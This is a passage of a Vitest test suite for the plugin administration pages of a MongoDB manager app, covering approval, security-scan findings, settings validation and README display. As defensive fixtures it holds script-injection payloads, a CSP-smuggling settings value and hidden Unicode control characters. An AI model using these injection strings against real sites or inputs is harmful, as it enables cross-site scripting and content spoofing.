import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { flushPromises } from '@vue/test-utils'
import { createMemoryHistory } from 'vue-router'
import { createPinia, setActivePinia } from 'pinia'
import { PERMISSIONS } from '@mongo-manager/shared'
import type { PluginAdminView, PluginRuntimeView } from '@mongo-manager/shared'
import PluginsView from '../src/admin/PluginsView.vue'
import PluginDetailsView from '../src/admin/PluginDetailsView.vue'
import PluginFrame from '../src/plugins/PluginFrame.vue'
import PluginCellText from '../src/plugins/PluginCellText.vue'
import TreeNode from '../src/documents/TreeNode.vue'
import NestedValue from '../src/documents/NestedValue.vue'
import CollectionTab from '../src/workspace/tabs/CollectionTab.vue'
import WorkspaceView from '../src/views/WorkspaceView.vue'
import DialogHost from '../src/ds/DsConfirmHost.vue'
import { createAppRouter } from '../src/router'
import { i18n } from '../src/i18n'
import { usePluginsStore } from '../src/plugins/store'
import { forgetAppInput } from '../src/plugins/appInput'
import { useCollectionViewsStore } from '../src/stores/collectionViews'
import { useTabsStore } from '../src/stores/tabs'
import { documentKeys } from '../src/api/documents'
import { useDialogStore } from '../src/stores/dialogs'
import { useToastStore } from '../src/stores/toasts'
import { useWorkspaceDialogs } from '../src/stores/workspaceDialogs'
import { commandTitle, useCommandsStore } from '../src/stores/commands'
import { ACCENTS, usePreferencesStore } from '../src/stores/preferences'
import { ACCENTS as KIT_ACCENTS } from '../../plugins/kit/src/look'
import { decodeValue } from '../src/documents/values'
import {
  cellCache,
  cellText,
  cellTextFor,
  matches,
  provideCellPlace,
  rememberCellPlace,
} from '../src/plugins/cells'
import { rowMenuItems } from '../src/documents/rowMenu'
import type { Bridge } from '../src/plugins/bridge'
import { defineComponent, h, ref, type Component } from 'vue'
import { provideMaskedPatterns } from '../src/masking/useMaskedPaths'
import { mockApi, mountApp, type Handler } from './support/app'
import { button, typeInto } from './support/dom'

const TOKEN_FIXED = '00000000-0000-4000-8000-0000000000aa'
/** Whether the user just clicked (in a frame or the app): what a plugin's acting in the app needs. */
const activation = { isActive: true }
beforeEach(() => {
  activation.isActive = true
  Object.defineProperty(navigator, 'userActivation', {
    value: activation,
    configurable: true,
    enumerable: true,
  })
  vi.spyOn(crypto, 'randomUUID').mockReturnValue(TOKEN_FIXED)
  localStorage.clear()
  setActivePinia(createPinia())
  i18n.global.locale.value = 'en'
  cellCache.clear()
  forgetAppInput()
})
afterEach(() => {
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
  document.body.innerHTML = ''
})

const DIGEST = 'ab'.repeat(32)
const manifest = (over: Record<string, unknown> = {}) => ({
  id: 'hello',
  name: { en: 'Hello', tr: 'Merhaba' },
  version: '1.0.0',
  entry: 'index.html',
  permissions: ['documents:read'],
  contributes: {
    collectionTabs: [{ id: 'map', title: { en: 'Map', tr: 'Harita' }, icon: 'map' }],
    documentActions: [{ id: 'show', title: { en: 'Show on map' } }],
    sidebarPanels: [{ id: 'side', title: { en: 'Side panel' } }],
    cellRenderers: [{ id: 'point', match: 'geojson' }],
  },
  settings: { tileUrl: { type: 'url', title: { en: 'Tile server' } } },
  ...over,
})
const adminView = (over: Partial<PluginAdminView> = {}): PluginAdminView => ({
  id: 'hello',
  source: 'upload',
  manifest: manifest() as never,
  digest: DIGEST,
  fileCount: 3,
  bytes: 2048,
  enabled: false,
  approvedPermissions: [],
  approvedCurrent: false,
  newPermissions: ['documents:read'],
  settings: {},
  installedBy: null,
  installedAt: 0,
  updatedAt: 0,
  error: null,
  updatedFrom: null,
  readme: false,
  scan: { findings: [], counts: { high: 0, medium: 0, low: 0, info: 0 }, truncated: false },
  origin: null,
  approvalCarried: false,
  ...over,
})
/** A scan that found `el.innerHTML = location.hash` in evil.js, and a fetch in net.js. */
const RISKY_SCAN: NonNullable<PluginAdminView['scan']> = {
  findings: [
    {
      rule: 'html-injection',
      severity: 'high',
      file: 'evil.js',
      line: 7,
      excerpt: 'el.innerHTML = location.hash',
    },
    { rule: 'network', severity: 'medium', file: 'net.js', line: 2, excerpt: 'fetch(u)' },
  ],
  counts: { high: 1, medium: 1, low: 0, info: 0 },
  truncated: true,
}
const runtime = (over: Partial<PluginRuntimeView> = {}): PluginRuntimeView => ({
  id: 'hello',
  version: '1.0.0',
  name: { en: 'Hello', tr: 'Merhaba' },
  entry: 'index.html',
  permissions: ['documents:read'],
  contributes: manifest().contributes as never,
  settings: { tileUrl: 'https://tiles.example.org/{z}/{x}/{y}.png' },
  ...over,
})
const TICKET = { base: 'plugin-frame/abc.def/', entry: 'index.html', expiresAt: 0 }
/** A ticket whose page is blank: a real frame window to talk to, nothing fetched. */
const BLANK = { base: 'about:', entry: 'blank', expiresAt: 0 }
const connection = {
  id: 'c1',
  name: 'Prod',
  group: null,
  color: null,
  favorite: false,
  readOnly: false,
  settings: {},
  uri: '',
  createdAt: 0,
  updatedAt: 0,
  lastUsedAt: null,
  access: 'admin',
  permissions: [...PERMISSIONS],
  export: true,
}
/** The token the host greeted the frame's page with: in every message the page sends. */
let token = ''
const send = (data: unknown, source: Window) => {
  const own = !!data && typeof data === 'object' && (data as { mm?: unknown }).mm === 1 && !('token' in data)
  window.dispatchEvent(
    new MessageEvent('message', {
      data: own ? { ...(data as object), token } : data,
      origin: 'null',
      source,
    }),
  )
}
/** The token the host greets a page with (fixed here); the page loads by itself (about:blank). */
const TOKEN = TOKEN_FIXED
async function loadPage(_el: HTMLIFrameElement, _sent: unknown[]) {
  await flushPromises()
  token = TOKEN
}

describe('the Plugins page (phase 4b §2)', () => {
  function page(plugins: PluginAdminView[], extra: Record<string, Handler> = {}, enabled = true) {
    const api = mockApi({ 'GET plugins/manage': () => [200, { enabled, plugins }], ...extra })
    mountApp(PluginsView)
    mountApp(DialogHost)
    return api
  }
  const card = (id: string) => document.querySelector<HTMLElement>(`[data-plugin="${id}"]`)!

  it('shows what each plugin is, adds and asks for, with its state', async () => {
    page([
      adminView(),
      adminView({
        id: 'broken',
        manifest: null,
        digest: null,
        error: 'The manifest is not valid: id',
        source: 'folder',
      }),
      adminView({
        id: 'on',
        enabled: true,
        approvedCurrent: true,
        approvedPermissions: ['documents:read'],
        newPermissions: [],
      }),
    ])
    await flushPromises()
    const hello = card('hello').textContent!
    expect(hello).toContain('Hello')
    expect(hello).toContain('Waiting for approval')
    expect(hello).toContain('Collection tab: Map')
    // What a cell text is for (plugin tabs redesign: two renderers read as one "Cell text" twice).
    expect(hello).toContain('Cell text: GeoJSON')
    expect(hello).toContain('read documents')
    expect(hello).toContain('new')
    expect(hello).toContain('sha256 abababababababab')
    expect(card('broken').querySelector('[data-plugin-error]')!.textContent).toContain('not valid')
    expect(card('broken').textContent).not.toContain('Approve')
    expect(card('on').querySelector('[data-plugin-status]')!.textContent).toBe('Enabled')
  })

  it('says what each wave 2 permission lets a plugin read (wave 2)', async () => {
    page([
      adminView({
        manifest: manifest({ permissions: ['documents:read', 'collection:read', 'database:read'] }) as never,
        newPermissions: ['documents:read', 'collection:read', 'database:read'],
      }),
    ])
    await flushPromises()
    const hello = card('hello').textContent!
    expect(hello).toContain('read this collection’s indexes')
    expect(hello).toContain('read the other collections of the same database')
    expect(hello).not.toContain('change documents')
  })

  it('approves a plugin for the files shown, after asking', async () => {
    const { calls } = page([adminView()], {
      'POST plugins/hello/approve': () => [200, adminView({ enabled: true })],
    })
    await flushPromises()
    ;[...card('hello').querySelectorAll('button')].find((b) => b.textContent?.includes('Approve'))!.click()
    await flushPromises()
    expect(document.body.textContent).toContain('read documents')
    ;(document.querySelector('[data-test="confirm"]') as HTMLButtonElement).click()
    await flushPromises()
    expect(calls.find((c) => c.method === 'POST')).toMatchObject({
      path: 'plugins/hello/approve',
      body: { digest: DIGEST },
    })
    // Nothing high: a plain approval, no risk accepted.
    expect(calls.find((c) => c.method === 'POST')!.body).toEqual({ digest: DIGEST })
  })

  it('offers a plugin’s settings only while it is enabled (user report 2026-10-10)', async () => {
    page([
      adminView({
        id: 'off',
        enabled: false,
        approvedCurrent: true,
        approvedPermissions: ['documents:read'],
      }),
      adminView({ id: 'waiting' }),
      adminView({ id: 'on', enabled: true, approvedCurrent: true, approvedPermissions: ['documents:read'] }),
    ])
    await flushPromises()
    const settings = (id: string) =>
      [...card(id).querySelectorAll('button')].some((b) => b.textContent?.trim() === 'Settings')
    expect(settings('off')).toBe(false)
    expect(settings('waiting')).toBe(false)
    expect(settings('on')).toBe(true)
  })

  it('checks a tile server address before saving settings', async () => {
    const on = adminView({ enabled: true, approvedCurrent: true, approvedPermissions: ['documents:read'] })
    const { calls } = page([on], { 'PUT plugins/hello/settings': () => [200, on] })
    await flushPromises()
    button('Settings').click()
    await flushPromises()
    const field = document.querySelector<HTMLInputElement>('form#plugin-settings input')!
    await typeInto(field, "https://tiles.example.org/x.png'; script-src *")
    expect(document.querySelector('form#plugin-settings')!.textContent).toContain('Not an https address')
    expect(button('Save').disabled).toBe(true)
    await typeInto(field, 'https://{s}.tile.example.org/{z}/{x}/{y}.png')
    button('Save').click()
    await flushPromises()
    expect(calls.find((c) => c.method === 'PUT')!.body).toEqual({
      values: { tileUrl: 'https://{s}.tile.example.org/{z}/{x}/{y}.png' },
    })
  })

  // Security audit 2026-10-16 (M1): the address is where a plugin may send what it reads.
  it('takes plain http for this computer only, and says the plugin may send data to the address', async () => {
    const on = adminView({ enabled: true, approvedCurrent: true, approvedPermissions: ['documents:read'] })
    page([on], { 'PUT plugins/hello/settings': () => [200, on] })
    await flushPromises()
    button('Settings').click()
    await flushPromises()
    const form = document.querySelector('form#plugin-settings')!
    expect(form.textContent).toContain('may send what it reads to this address')
    const field = document.querySelector<HTMLInputElement>('form#plugin-settings input')!
    await typeInto(field, 'http://tiles.example.org/{z}/{x}/{y}.png')
    expect(form.textContent).toContain('Not an https address')
    expect(button('Save').disabled).toBe(true)
    await typeInto(field, 'http://localhost:8080/{z}/{x}/{y}.png')
    expect(button('Save').disabled).toBe(false)
  })

  // Review of the security pass (Minor): after the upgrade, a plain-http address saved before is kept
  // but given to no frame — its administrators are told, on the card.
  it('says when a saved address is no longer taken, and what to set instead', async () => {
    page([
      adminView({
        enabled: true,
        approvedCurrent: true,
        approvedPermissions: ['documents:read'],
        settings: { tileUrl: 'http://tiles.example.org/{z}/{x}/{y}.png' },
      }),
    ])
    await flushPromises()
    const note = card('hello').querySelector('[data-plugin-address-refused]')!
    expect(note.textContent).toContain('Tile server')
    expect(note.textContent).toContain('https')
    document.body.innerHTML = ''
    page([adminView({ enabled: true, settings: { tileUrl: 'https://tiles.example.org/{z}/{x}/{y}.png' } })])
    await flushPromises()
    expect(card('hello').querySelector('[data-plugin-address-refused]')).toBeNull()
  })

  it('says, before approving, that a plugin with an address setting may send data there', async () => {
    page([adminView()])
    await flushPromises()
    ;[...card('hello').querySelectorAll('button')].find((b) => b.textContent?.includes('Approve'))!.click()
    await flushPromises()
    expect(document.querySelector('[role="dialog"]')!.textContent).toContain(
      'may send what it reads to the address set there',
    )
    ;(document.querySelector('[data-test="cancel"]') as HTMLButtonElement).click()
    await flushPromises()
    document.body.innerHTML = ''
    page([adminView({ manifest: manifest({ settings: {} }) as never })])
    await flushPromises()
    ;[...card('hello').querySelectorAll('button')].find((b) => b.textContent?.includes('Approve'))!.click()
    await flushPromises()
    expect(document.querySelector('[role="dialog"]')!.textContent).not.toContain('may send what it reads')
  })

  it('says when plugins are turned off, offering nothing', async () => {
    page([], {}, false)
    await flushPromises()
    expect(document.querySelector('[data-plugins-off]')).not.toBeNull()
    expect(document.querySelector('[data-plugin-upload]')).toBeNull()
  })
})

// User request 2026-10-11 ("her eklentide aa evet yükle olmamalı"): what the scan found is shown,
// and a plugin with a high finding is approved only with its id typed.
describe('a plugin’s security scan', () => {
  function page(plugins: PluginAdminView[]) {
    const api = mockApi({
      'GET plugins/manage': () => [200, { enabled: true, plugins }],
      'POST plugins/hello/approve': () => [200, adminView({ enabled: true })],
    })
    mountApp(PluginsView)
    mountApp(DialogHost)
    return api
  }
  const card = (id: string) => document.querySelector<HTMLElement>(`[data-plugin="${id}"]`)!
  const approveOn = (id: string) =>
    [...card(id).querySelectorAll('button')].find((b) => b.textContent?.includes('Approve'))!.click()
  const confirmButton = () => document.querySelector<HTMLButtonElement>('[data-test="confirm"]')!

  it('badges each card with what its scan found', async () => {
    page([
      adminView({ scan: RISKY_SCAN }),
      adminView({ id: 'clean' }),
      adminView({
        id: 'review',
        scan: { ...RISKY_SCAN, counts: { high: 0, medium: 2, low: 0, info: 0 } },
      }),
      adminView({ id: 'unread', scan: null }),
      adminView({ id: 'low', scan: { ...RISKY_SCAN, counts: { high: 0, medium: 0, low: 2, info: 3 } } }),
    ])
    await flushPromises()
    const badge = (id: string) => card(id).querySelector('[data-plugin-scan]')?.textContent?.trim()
    expect(badge('hello')).toBe('1 high risk')
    expect(badge('review')).toBe('2 to review')
    expect(badge('clean')).toBe('No risks found')
    expect(badge('low')).toBe('2 low risks')
    expect(badge('unread')).toBeUndefined()
  })

  it('asks for its id to be typed when its scan found high risks, and sends that it was accepted', async () => {
    const { calls } = page([adminView({ scan: RISKY_SCAN })])
    await flushPromises()
    approveOn('hello')
    await flushPromises()
    const dialog = document.body.textContent!
    expect(dialog).toContain('1 high risk')
    expect(dialog).toContain('Writes markup from text')
    expect(confirmButton().disabled).toBe(true)
    await typeInto(document.querySelector('[data-test="require-text"] input') as HTMLInputElement, 'hell')
    expect(confirmButton().disabled).toBe(true)
    await typeInto(document.querySelector('[data-test="require-text"] input') as HTMLInputElement, 'hello')
    expect(confirmButton().disabled).toBe(false)
    confirmButton().click()
    await flushPromises()
    expect(calls.find((c) => c.method === 'POST')!.body).toEqual({ digest: DIGEST, acceptRisk: 'hello' })
  })

  it('asks nothing typed of a plugin shipped with the app, or of one with nothing high', async () => {
    page([adminView({ source: 'bundled', scan: RISKY_SCAN })])
    await flushPromises()
    approveOn('hello')
    await flushPromises()
    expect(document.querySelector('[data-test="require-text"]')).toBeNull()
    // What it found is still said.
    expect(document.body.textContent).toContain('Security scan: 1 high, 1 medium, 0 low, 0 notes')
    expect(confirmButton().disabled).toBe(false)
  })

  // Review 2026-10-11: a plugin whose scan failed is approved as one with a high finding is.
  it('asks for the id of a plugin whose files could not be scanned', async () => {
    const { calls } = page([adminView({ scan: null })])
    await flushPromises()
    approveOn('hello')
    await flushPromises()
    expect(document.body.textContent).toContain('Its files could not be scanned')
    expect(confirmButton().disabled).toBe(true)
    await typeInto(document.querySelector('[data-test="require-text"] input') as HTMLInputElement, 'hello')
    confirmButton().click()
    await flushPromises()
    expect(calls.find((c) => c.method === 'POST')!.body).toEqual({ digest: DIGEST, acceptRisk: 'hello' })
  })

  it('explains a refusal for a risk not accepted', async () => {
    mockApi({
      'GET plugins/manage': () => [200, { enabled: true, plugins: [adminView({ scan: RISKY_SCAN })] }],
      'POST plugins/hello/approve': () => [
        409,
        { error: 'conflict', message: 'x', details: { reason: 'risk_not_accepted' } },
      ],
    })
    mountApp(PluginsView)
    mountApp(DialogHost)
    await flushPromises()
    approveOn('hello')
    await flushPromises()
    await typeInto(document.querySelector('[data-test="require-text"] input') as HTMLInputElement, 'hello')
    confirmButton().click()
    await flushPromises()
    expect(useToastStore().toasts.at(-1)?.message).toBe(
      'Its security scan found high risks: type its id to approve it anyway.',
    )
  })

  it('lists each finding on its details page: where, what, the line as text', async () => {
    mockApi({
      'GET plugins/manage': () => [
        200,
        {
          enabled: true,
          plugins: [
            adminView({
              scan: {
                ...RISKY_SCAN,
                findings: [
                  { ...RISKY_SCAN.findings[0]!, excerpt: '<img src=x onerror=alert(1)>' },
                  RISKY_SCAN.findings[1]!,
                ],
              },
            }),
          ],
        },
      ],
    })
    mountApp(PluginDetailsView, { props: { pluginId: 'hello' } })
    await flushPromises()
    const section = document.querySelector<HTMLElement>('[data-plugin-scan-findings]')!
    const items = [...section.querySelectorAll<HTMLElement>('[data-finding]')]
    expect(items).toHaveLength(2)
    expect(items[0]!.textContent).toContain('High')
    expect(items[0]!.textContent).toContain('Writes markup from text')
    expect(items[0]!.textContent).toContain('evil.js:7')
    expect(items[0]!.querySelector('code')!.textContent).toBe('<img src=x onerror=alert(1)>')
    expect(section.querySelector('img')).toBeNull()
    expect(items[1]!.textContent).toContain('Makes network requests')
    expect(section.textContent).toContain('cannot prove a plugin is safe')
    expect(section.textContent).toContain('the counts are whole')
  })

  it('says when nothing was found, and when its files could not be read', async () => {
    mockApi({
      'GET plugins/manage': () => [
        200,
        { enabled: true, plugins: [adminView(), adminView({ id: 'unread', scan: null })] },
      ],
    })
    mountApp(PluginDetailsView, { props: { pluginId: 'hello' } })
    await flushPromises()
    expect(document.querySelector('[data-plugin-scan-findings]')!.textContent).toContain(
      'Nothing of note was found',
    )
    document.body.innerHTML = ''
    mountApp(PluginDetailsView, { props: { pluginId: 'unread' } })
    await flushPromises()
    expect(document.querySelector('[data-plugin-scan-findings]')!.textContent).toContain('could not be read')
  })
})

// User request 2026-10-10: each plugin has a page of its own — who made it, when, what changed, its README.
describe('a plugin’s details page', () => {
  const detailed = (over: Partial<PluginAdminView> = {}) =>
    adminView({
      enabled: true,
      approvedPermissions: ['documents:read'],
      approvedCurrent: true,
      newPermissions: [],
      source: 'bundled',
      readme: true,
      updatedFrom: '1.0.1',
      manifest: manifest({
        version: '1.0.3',
        author: { name: 'Gokhan Ozgezer', url: 'https://example.org' },
        homepage: 'https://example.org/hello',
        repository: 'https://github.com/someone/hello',
        license: 'MIT',
        publishedAt: '2026-10-20',
        changelog: [
          { version: '1.0.1', date: '2026-09-01', notes: { en: 'First release.' } },
          {
            version: '1.0.3',
            date: '2026-10-20',
            notes: { en: 'Faster maps.', tr: 'Daha hızlı haritalar.' },
          },
          { version: '1.0.2', date: '2026-10-01', notes: { en: 'Fewer clicks.' } },
        ],
      }) as never,
      ...over,
    })
  const asked: Array<string | null> = []
  async function details(
    view: PluginAdminView,
    readme: string | null = '# Hello\n\nUse it <script>alert(1)</script>',
  ) {
    const api = mockApi({
      'GET plugins/manage': () => [200, { enabled: true, plugins: [view] }],
      [`GET plugins/${view.id}/readme`]: (_b, url) => {
        asked.push(url.searchParams.get('lang'))
        return [200, { text: readme, truncated: readme !== null && readme.length > 30 }]
      },
      [`DELETE plugins/${view.id}`]: () => [204],
    })
    mountApp(PluginDetailsView, { props: { pluginId: view.id } })
    mountApp(DialogHost)
    await flushPromises()
    await flushPromises()
    return api
  }
  const text = () => document.querySelector('[data-plugin-details]')?.textContent ?? ''

  it('says who made it, when, under which license, with its addresses opened apart', async () => {
    await details(detailed())
    expect(text()).toContain('Hello')
    expect(text()).toContain('1.0.3')
    expect(text()).toContain('Gokhan Ozgezer')
    expect(text()).toContain('MIT')
    expect(text()).toContain('Oct 20, 2026')
    const links = [...document.querySelectorAll<HTMLAnchorElement>('[data-plugin-details] a[href^="https:"]')]
    expect(links.map((a) => a.href)).toEqual(
      expect.arrayContaining([
        'https://example.org/',
        'https://example.org/hello',
        'https://github.com/someone/hello',
      ]),
    )
    for (const a of links) {
      expect(a.target).toBe('_blank')
      expect(a.rel).toBe('noopener noreferrer')
    }
  })

  it('lists the release notes newest first, marking those since the version it was updated from', async () => {
    await details(detailed())
    const notes = [...document.querySelectorAll<HTMLElement>('[data-release]')]
    expect(notes.map((n) => n.dataset.release)).toEqual(['1.0.3', '1.0.2', '1.0.1'])
    expect(notes[0]!.textContent).toContain('Faster maps.')
    expect(notes[0]!.textContent).toContain('New')
    expect(notes[1]!.textContent).toContain('New')
    expect(notes[2]!.textContent).not.toContain('New')
    expect(text()).toContain('Updated from 1.0.1 to 1.0.3')
    i18n.global.locale.value = 'tr'
    await flushPromises()
    expect(document.querySelector('[data-release="1.0.3"]')!.textContent).toContain('Daha hızlı haritalar.')
  })

  it('says which GitHub release it was installed from, its page opened apart', async () => {
    await details(
      detailed({
        source: 'upload',
        origin: {
          kind: 'github',
          repository: 'someone/hello',
          release: 'v1.0.3',
          asset: 'hello-1.0.3.tgz',
          url: 'https://github.com/someone/hello/releases/tag/v1.0.3',
        },
      }),
    )
    const from = document.querySelector<HTMLElement>('[data-plugin-origin]')!
    expect(from.textContent).toContain('From GitHub')
    expect(from.textContent).toContain('someone/hello, release v1.0.3')
    const a = from.querySelector('a')!
    expect(a.href).toBe('https://github.com/someone/hello/releases/tag/v1.0.3')
    expect(a.target).toBe('_blank')
    expect(a.rel).toBe('noopener noreferrer')
    document.body.innerHTML = ''
    await details(detailed())
    expect(document.querySelector('[data-plugin-origin]')).toBeNull()
  })

  it('shows its README as text: no markup of it runs', async () => {
    await details(detailed())
    const readme = document.querySelector('[data-plugin-readme]')!
    expect(readme.textContent).toContain('Hello')
    expect(readme.textContent).toContain('<script>alert(1)</script>')
    expect(readme.querySelector('script')).toBeNull()
  })

  // User report 2026-10-11: a plugin that is off was said to have kept its approval.
  // Review 2026-10-11 (I1): kept only when it moved on its own; else an administrator approved it.
  it('says an update kept its approval only when it did', async () => {
    await details(detailed({ approvalCarried: true }))
    expect(text()).toContain('keeping its approval')
    document.body.innerHTML = ''
    await details(detailed({ approvalCarried: false }))
    expect(text()).not.toContain('keeping its approval')
    expect(text()).toContain('Updated from 1.0.1 to 1.0.3, approved by an administrator')
  })

  it('says an update waits for approval when the plugin is off or not approved for it', async () => {
    await details(detailed({ enabled: false, approvedCurrent: false }))
    expect(text()).toContain('Updated from 1.0.1 to 1.0.3')
    expect(text()).toContain('It is not in use: look at what changed and approve it to use it')
    expect(text()).not.toContain('keeping its approval')
  })

  it('says when there is no README, no release notes, or no such plugin', async () => {
    await details(adminView({ readme: false }), null)
    expect(text()).toContain('No README')
    expect(text()).toContain('No release notes')
    document.body.innerHTML = ''
    mockApi({ 'GET plugins/manage': () => [200, { enabled: true, plugins: [] }] })
    mountApp(PluginDetailsView, { props: { pluginId: 'gone' } })
    await flushPromises()
    expect(document.querySelector('[data-plugin-details]')!.textContent).toContain('No such plugin')
  })

  // Review 2026-10-10 (details): its README in the reader's language, outlined, nothing hidden in it.
  it('asks for the README in the reader’s language, outlines it, and shows what could hide or reverse text', async () => {
    asked.length = 0
    await details(
      detailed(),
      '# Use\n\nThe word ev\u202Eil and ad\u200bmin, more text here. Made by \u{1f469}\u200d\u{1f4bb}.',
    )
    expect(asked.at(-1)).toBe('en')
    const readme = document.querySelector('[data-plugin-readme]')!
    expect(readme.querySelector('h4')!.textContent).toBe('Use')
    expect(readme.textContent).not.toContain('\u202E')
    expect(readme.textContent).toContain('\\u202e')
    // Security audit 2026-10-16 (M2): what shows as nothing too.
    expect(readme.textContent).not.toContain('\u200b')
    expect(readme.textContent).toContain('ad\\u200bmin')
    // An emoji's own joiner hides nothing (review of the security pass).
    expect(readme.textContent).not.toContain('\\u200d')
    expect(text()).toContain('Only the start of the README is shown')
  })

  it('names the plugin alone in its heading, labels its sections by their headings, says what was approved', async () => {
    await details(detailed())
    expect(document.querySelector('[data-plugin-details] h2')!.textContent!.trim()).toBe('Hello')
    for (const region of document.querySelectorAll('[data-plugin-details] section[aria-labelledby]')) {
      const heading = document.getElementById(region.getAttribute('aria-labelledby')!)
      expect(heading?.tagName).toBe('H3')
    }
    expect(document.querySelectorAll('[data-plugin-details] section[aria-label]').length).toBe(0)
    expect(text()).toContain('Approved')
  })

  it('leaves the page for the list when the plugin is removed — and only then', async () => {
    const tabs = useTabsStore()
    tabs.open({ kind: 'pluginDetails', title: '', params: { pluginId: 'hello' } })
    await details(detailed({ source: 'upload' }))
    // Removing is in the header's "…" menu (UI redesign §0 decision 3).
    document
      .querySelector<HTMLButtonElement>('[data-plugin-details] button[aria-label="More actions for Hello"]')!
      .click()
    await flushPromises()
    ;[...document.querySelectorAll<HTMLElement>('[role="menuitem"]')]
      .find((b) => b.textContent?.trim() === 'Remove')!
      .click()
    await flushPromises()
    useDialogStore().settle(true)
    await flushPromises()
    await flushPromises()
    expect(tabs.tabs.some((t) => t.kind === 'pluginDetails')).toBe(false)
    expect(tabs.active?.kind).toBe('plugins')
  })

  // Review of R3–R5, minor 4: the header's "…" removes only for its Remove entry, not for any entry
  // a later version adds beside it.
  it('removes only when Remove is chosen in its menu', async () => {
    const { calls } = await details(detailed({ source: 'upload' }))
    const menu = document.querySelector('[data-plugin-details] button[aria-label="More actions for Hello"]')!
    const host = (menu as unknown as { __vueParentComponent: { emit: (e: string, id: string) => void } })
      .__vueParentComponent
    host.emit('select', 'something-else')
    await flushPromises()
    useDialogStore().settle(true)
    await flushPromises()
    expect(calls.some((c) => c.method === 'DELETE')).toBe(false)
  })

  it('stays when removing fails', async () => {
    const tabs = useTabsStore()
    tabs.open({ kind: 'pluginDetails', title: '', params: { pluginId: 'hello' } })
    mockApi({
      'GET plugins/manage': () => [200, { enabled: true, plugins: [detailed({ source: 'upload' })] }],
      'GET plugins/hello/readme': () => [200, { text: null, truncated: false }],
      'DELETE plugins/hello': () => [500, { code: 'INTERNAL', message: 'no' }],
    })
    mountApp(PluginDetailsView, { props: { pluginId: 'hello' } })
    mountApp(DialogHost)
    await flushPromises()
    // Removing is in the header's "…" menu (UI redesign §0 decision 3).
    document
      .querySelector<HTMLButtonElement>('[data-plugin-details] button[aria-label="More actions for Hello"]')!
      .click()
    await flushPromises()
    ;[...document.querySelectorAll<HTMLElement>('[role="menuitem"]')]
      .find((b) => b.textContent?.trim() === 'Remove')!
      .click()
    await flushPromises()
    useDialogStore().settle(true)
    await flushPromises()
    await flushPromises()
    expect(tabs.active?.kind).toBe('pluginDetails')
  })

  it('shows where each address goes', async () => {
    await details(detailed())
    const repo = [...document.querySelectorAll<HTMLAnchorElement>('[data-plugin-details] a')].find((a) =>
      a.href.startsWith('https://github.com/'),
    )!
    expect(repo.textContent).toContain('github.com/someone/hello')
    expect(repo.title).toBe('https://github.com/someone/hello')
    const author = [...document.querySelectorAll<HTMLAnchorElement>('[data-plugin-details] a')].find((a) =>
      a.textContent?.includes('Gokhan'),
    )!
    expect(author.title).toBe('https://example.org')
  })

  it('opens from its card on the Plugins page, which says when it was updated', async () => {
    mockApi({ 'GET plugins/manage': () => [200, { enabled: true, plugins: [detailed()] }] })
    mountApp(PluginsView)
    await flushPromises()
    const card = document.querySelector<HTMLElement>('[data-plugin="hello"]')!
    expect(card.textContent).toContain('Updated to 1.0.3')
    // Review M14: Details before the danger of Remove; the name opens the page too.
    const labels = [...card.querySelectorAll<HTMLButtonElement>('button')].map((b) => b.textContent?.trim())
    expect(labels.indexOf('Details')).toBeGreaterThanOrEqual(0)
    card.querySelector<HTMLButtonElement>('[data-plugin-name]')!.click()
    await flushPromises()
    expect(useTabsStore().active).toMatchObject({ kind: 'pluginDetails', params: { pluginId: 'hello' } })
    ;[...card.querySelectorAll<HTMLButtonElement>('button')]
      .find((b) => b.textContent?.trim() === 'Details')!
      .click()
    await flushPromises()
    expect(useTabsStore().active).toMatchObject({ kind: 'pluginDetails', params: { pluginId: 'hello' } })
  })

  // Inside the details' block for its `detailed` plugin.
  describe('removing a plugin from the list (review of R3–R5, I-4)', () => {
    it('offers Remove in the card’s “…”, in danger colour, and asks first', async () => {
      const { calls } = mockApi({
        'GET plugins/manage': () => [200, { enabled: true, plugins: [detailed({ source: 'upload' })] }],
        'DELETE plugins/hello': () => [204],
      })
      mountApp(PluginsView)
      mountApp(DialogHost)
      await flushPromises()
      const card = document.querySelector<HTMLElement>('[data-plugin="hello"]')!
      expect([...card.querySelectorAll('button')].map((b) => b.textContent?.trim())).not.toContain('Remove')
      card.querySelector<HTMLButtonElement>('button[aria-label="More actions for Hello"]')!.click()
      await flushPromises()
      const item = [...document.querySelectorAll<HTMLElement>('[role="menuitem"]')].find(
        (m) => m.textContent?.trim() === 'Remove',
      )!
      expect(item.className).toContain('text-danger')
      item.click()
      await flushPromises()
      expect(calls.some((c) => c.method === 'DELETE')).toBe(false)
      useDialogStore().settle(true)
      await flushPromises()
      expect(calls.some((c) => c.method === 'DELETE' && c.path === 'plugins/hello')).toBe(true)
    })

    // Review of R3–R5, minor 16: the hidden file field behind Upload is no Tab stop of its own.
    it('keeps the hidden upload field out of the Tab order', async () => {
      mockApi({ 'GET plugins/manage': () => [200, { enabled: true, plugins: [] }] })
      mountApp(PluginsView)
      await flushPromises()
      expect(document.querySelector<HTMLInputElement>('[data-plugin-upload]')!.tabIndex).toBe(-1)
    })

    it('offers no menu for a plugin shipped with the app', async () => {
      mockApi({ 'GET plugins/manage': () => [200, { enabled: true, plugins: [detailed()] }] })
      mountApp(PluginsView)
      await flushPromises()
      expect(
        document.querySelector('[data-plugin="hello"] button[aria-label="More actions for Hello"]'),
      ).toBeNull()
    })
  })
})

describe('a plugin frame (phase 4b §3)', () => {
  function frame(props: Record<string, unknown> = {}, extra: Record<string, Handler> = {}, ticket = BLANK) {
    const api = mockApi({
      'GET plugins/hello/ticket': () => [200, ticket],
      'GET connections': () => [200, [connection]],
      // The plugin's collection is a collection (a write asks; review M1).
      'GET connections/c1/databases/shop/collections': () => [
        200,
        [{ name: 'places', type: 'collection', options: {}, readOnly: false }],
      ],
      ...extra,
    })
    const { wrapper, queryClient } = mountApp(PluginFrame, {
      props: {
        plugin: runtime(),
        kind: 'collectionTab',
        contribution: 'map',
        target: { connectionId: 'c1', db: 'shop', coll: 'places' },
        ...props,
      },
    })
    mountApp(DialogHost)
    return { ...api, wrapper, queryClient }
  }
  async function iframe() {
    await flushPromises()
    const el = document.querySelector<HTMLIFrameElement>('[data-plugin-frame] iframe')!
    const sent: Array<{ id: unknown; result?: unknown; error?: { code: string } }> = []
    vi.spyOn(el.contentWindow!, 'postMessage').mockImplementation((d: unknown) => void sent.push(d as never))
    await loadPage(el, sent)
    // The user clicked in the plugin's page: the frame has the focus (security audit 2026-10-16).
    el.focus()
    return {
      el,
      sent,
      ask: async (id: number, method: string, params?: unknown) => {
